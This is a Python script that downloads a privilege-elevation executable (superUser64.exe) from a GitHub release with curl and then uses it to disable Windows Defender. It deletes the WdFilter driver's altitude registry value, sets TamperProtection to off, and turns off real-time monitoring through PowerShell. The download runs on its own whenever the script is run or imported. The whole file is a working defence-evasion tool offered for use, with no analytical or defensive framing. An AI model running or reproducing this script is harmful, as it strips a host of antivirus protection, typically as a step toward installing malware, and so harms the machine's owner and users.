import subprocess
import os

if not os.path.exists("downloads"):
    os.mkdir("downloads")

if not os.path.exists("downloads/superUser64.exe"):
    payload = "curl -L -H \"Accept: application/octet-stream\" github.com/mspaintmsi/superUser/releases/download/v6.0/superUser64.exe -o downloads\\superUser64.exe"
    subprocess.run(payload, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

class Defender:
    def __init__(self):
        self.superUserFile = r"downloads\superUser64 /ws powershell.exe"
        self.driverError = False
        self.tamperError = False
        self.realtimeError = False

    def disable_protecting_driver(self):
        payload = f"{self.superUserFile} reg delete \"HKLM\System\CurrentControlSet\Services\WdFilter\Instances\WdFilter Instance\" /v Altitude /f"
        result = subprocess.run(payload, shell=True, capture_output=True)
        if result.stderr:
            self.driverError = True

    def disable_tamper_protection(self):
        payload = f"{self.superUserFile} reg add \"HKLM\SOFTWARE\Microsoft\Windows Defender\Features\" /v TamperProtection /t REG_DWORD /d 4 /f"
        result = subprocess.run(payload, shell=True, capture_output=True)
        if result.stderr:
            self.tamperError = True

    def disable_real_time_protection(self):
        payload = f"{self.superUserFile} Set-MpPreference -DisableRealTimeMonitoring $true"
        result = subprocess.run(payload, shell=True, capture_output=True)
        if result.stderr:
            self.realtimeError = True

if __name__ == "__main__":
    defender = Defender()
    defender.disable_protecting_driver()
    defender.disable_tamper_protection()
    defender.disable_real_time_protection()
